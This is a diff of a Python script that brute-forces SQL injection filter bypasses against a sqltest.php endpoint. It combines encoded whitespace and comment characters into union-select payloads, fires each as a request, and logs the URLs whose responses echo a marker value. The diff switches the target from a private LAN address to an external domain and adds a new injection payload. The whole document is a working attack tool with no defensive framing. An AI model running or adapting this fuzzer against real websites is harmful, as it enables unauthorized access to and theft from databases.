@@ -10,7 +10,7 @@ fuzz_ch = ['%0a','%0b','%0c','%0d','%0e','%0f','%0g','%0h','%0i','%0j']
 
 fuzz = fuzz_zs + fuzz_sz + fuzz_ch
 headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
-target = 'http://192.168.1.131/sqltest.php?x=1'
+target = 'http://lrzdjx.com/sqltest.php?x=1'
 nums = len(fuzz) ** 5
 num = 0
 
@@ -24,13 +24,17 @@ if __name__ == '__main__':
         num += 1
         #payload = "/*!union" + a + b + c + d + e + "select*/ 1,2,3"
         ret = a + b + c + d + e
-        payload = ret + 'and' + ret + '1'
-        url = target + payload
+        #payload = "/*!union" + ret + "select*/ 1,2,3"
+        #url = target + payload
+
+        # 寻找替换空格
+        url = 'http://lrzdjx.com/sqltest.php?x=1|@a:=(select /*{}*/3)union(select 11111111111,2,@a)'.format(ret)
         print('[{}] {}'.format(num, url))
         try:
             res = requests.get(url)
-            if '用户名' in res.text:
-                with open('ret2.txt', 'at', encoding='utf-8') as f:
+            if '11111111111' in res.text:
+                with open('ret1.txt', 'at', encoding='utf-8') as f:
+                    print('11111111111')
                     f.writelines(url + '\n')
         except Exception as e:
             print(e)
